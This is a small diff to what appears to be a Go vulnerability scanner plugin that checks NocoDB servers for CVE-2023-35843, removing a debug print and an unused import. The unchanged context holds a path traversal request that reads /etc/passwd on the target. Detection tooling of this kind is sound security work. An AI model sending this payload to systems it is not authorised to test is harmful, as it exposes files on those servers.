@@ -3,7 +3,6 @@ package goplugin
 
 import (
 	"Yscanner/utils"
-	"fmt"
 	"net/http"
 	"strings"
 )
@@ -37,8 +36,6 @@ func (p *NocoDB_cve_2023_35843) Check(netloc string) bool {
 	}
 	// fmt.Println(resp0.ResponseRaw)
 	if resp0.Other.StatusCode == 200 {
-		fmt.Println("[*] Connect to NocoDB")
-
 		checkURL := netloc + "/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
 		checkReq, err := http.NewRequest("GET", checkURL, nil)
 		if err != nil {
